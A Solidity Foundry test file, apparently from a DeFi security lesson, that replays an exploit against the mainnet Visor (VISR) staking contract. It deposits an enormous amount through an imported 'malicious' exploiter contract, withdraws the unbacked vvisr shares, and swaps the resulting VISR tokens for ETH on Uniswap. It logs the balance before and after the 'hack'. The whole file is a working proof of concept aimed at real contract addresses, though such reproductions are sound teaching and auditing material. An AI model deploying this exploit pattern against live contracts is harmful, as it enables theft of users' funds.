// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lesson 2 - visr.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract visrExploitTest is Test {
    VisrInterface public visr;
    VisrExploiter public visrExploitContract;
    UniswapV2Interface public uniswap;
    address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IERC20 public visrToken;
    IERC20 public vvisrToken;
    uint256 MAX_INT = 0xfffffffffffffffffffffffffffffff;

    // setup function runs before tests begin
    function setUp() public {
        // The address of the deployed visrStaking contract
        visr = VisrInterface(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
        uniswap = UniswapV2Interface(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

        // set variables
        visrToken = IERC20(visr.visr());
        vvisrToken = IERC20(visr.vvisr());


        // the malicious contract we want to deploy
        visrExploitContract = new VisrExploiter();

        vm.startPrank(address(0x7));
    }
    

    // anything prefixed with test will start with the
    function testvisr() public {
        // VM cheat code that sets address to 3
        console.log("ETH BALANCE BEFORE HACK: ", address(0x7).balance);
        visr.deposit(MAX_INT, address(visrExploitContract), address(0x7));
        visr.withdraw(vvisrToken.balanceOf(address(0x7)), address(0x7), address(0x7));

        
        address visr_token = address(visr.visr());
        address[] memory path = new address[](2);
        path[0] = address(visrToken);
        path[1] = weth;
        visrToken.approve(address(uniswap), visrToken.balanceOf(address(0x7)));
        uint[] memory amounts = uniswap.swapExactTokensForETH(visrToken.balanceOf(address(0x7)), 0, path, address(0x7), 2650097619);
        console.log("ETH BALANCE AFTER HACK: ", address(0x7).balance);
    }
}
